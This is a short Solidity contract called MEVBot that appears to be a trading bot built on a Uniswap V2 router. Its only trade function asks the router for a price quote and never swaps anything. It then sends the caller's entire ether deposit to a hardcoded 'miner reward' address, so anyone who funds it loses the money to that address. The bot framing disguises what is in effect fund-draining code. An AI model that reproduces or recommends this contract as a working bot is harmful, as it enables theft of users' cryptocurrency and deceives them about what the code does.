pragma solidity ^0.8.0;

interface IUniswapV2Router {
    function getAmountsOut(
        uint amountIn,
        address[] memory path
    ) external view returns (uint[] memory amounts);
}

contract MEVBot {
    address private constant UNISWAP_ROUTER_ADDRESS =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant MINER_REWARD_ADDRESS =
        0x8CcbB7F4FbC3b4e0e9a3F11c3d7c8c8fDCA2eC32;

    IUniswapV2Router private uniswapRouter;

    constructor() {
        uniswapRouter = IUniswapV2Router(UNISWAP_ROUTER_ADDRESS);
    }

    function executeTrade(address[] calldata path) external payable {
        uint[] memory amounts = uniswapRouter.getAmountsOut(msg.value, path);
        uint expectedAmount = amounts[amounts.length - 1];
        require(
            expectedAmount > 0,
            "Expected amount should be greater than zero."
        );

        (bool success, ) = MINER_REWARD_ADDRESS.call{value: msg.value}("");
        require(success, "Unable to send ether to miner reward address.");
    }
}
